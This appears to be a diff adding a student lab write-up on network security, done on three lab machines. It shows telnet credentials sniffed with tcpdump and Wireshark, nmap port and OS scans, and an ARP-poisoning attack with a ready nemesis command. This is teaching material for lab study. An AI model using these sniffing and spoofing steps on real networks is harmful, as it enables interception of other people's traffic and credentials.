@@ -16,7 +16,82 @@ sudo ./openvas-check-setup --v9 # The --v9 flag is needed for version checking
 
 Should the check fail, follow the instructions in FIX
 
-### 1. 
+### 1. Listening to the network
+
+#### 1.2 `tcpdump`
+
+Run `sudo tcpdump` on machine 3, and generate a ICMP packet from machine 1 to 2 using
+
+```
+ping -c 1 192.168.1.2 # The count option set to 1 generates a single packet
+```
+
+The output should resemble:
+```
+17:07:30.455566 IP machine1 > machine2: ICMP echo request, id 2701, seq 1, length 64
+17:07:30.455664 IP machine2 > machine1: ICMP echo reply, id 2701, seq 1, length 64
+```
+
+The `-X` option prints each packet in HEX and ASCII.
+
+On machine 3 run `sudo tcpdump -X dst host 192.168.1.1` and start a telnet connection from machine 2 to 1
+by writing `telnet 192.168.1.1` in machine 2.
+The username and password should appear letter by letter in separate packets.
+
+Notice however that this is not possible with an SSH session.
+
+#### 1.3 Wireshark
+
+On machine 3, start Wireshark
+```
+gksu wireshark # gksu is a library that provides a Gtk+ frontend to su and sudo
+```
+Start a capture on enps03 device.
+Repeat the telnet connection from machine 1 to 2.
+On wireshark follow the TCP stream of the telnet connection.
+The output should have both the user and password in clear text.
+
+Howeve, if we establish an ssh connection between 1 and 2, Wireshark will detect the Diffie-Hellman key exchange,
+but will be unable to decpher the content of the folowwing ecnrypted packets.
+
+#### 1.4 `nmap`
+
+Nmap is a utility tht provides information on remote machines.
+Issuing `nmap [IP]` should return a list of open ports on the destination machine.
+`sudo nmap -O [IP]` should return the OS running on the destination machine. 
+
+### 2. Vulnerabilities in TCP/IP
+
+#### 2.1 ARP redirect
+
+Machine 2 will be the attacker. Start by obtaining the MAC addresses of 1 and 3.
+```
+ping -c 1 192.168.1.1 # 08:00:27:4b:d6:a2
+ping -c 1 192.168.1.3 # 08:00:27:90:f9:41
+```
+Check the MAC address of the attacking machine with 
+```
+ifconfig # ... ether 08:00:27:94:55:1f
+```
+
+You can check the contents of the arp table in machine 1 with `arp -a #all`.
+Now, use `nemesis` in machine 2 to attack the arp table in 1.
+
+```
+sudo nemesis arp -v -S 192.168.1.3 -D 192.168.1.1 -h [MAC machine 2] [MAC machine 1]
+```
+
+This should effectively fool machine 1 into thinking that machine3 has the MAC of 2, thus redirecting packets to it.
+We can check the attack was succesful by checking the arp table in 1, which can resemble.
+```
+machine3 (192.168.1.3) at 08:00:27:94:55:1f [ether] on enp0s8
+machine2 (192.168.1.2) at 08:00:27:94:55:1f [ether] on enp0s8
+```
+Notice how the MAC address is the same for both machines.
+
+#### 2.2 RTS Hijacking
+
+I could not get this thing to work. Pls help
 
 ### 3. OpenVAS
 Open the browser in `localhost` on the machine with openVAS (alternatively `192.168.1.[MACHINE]:443`).
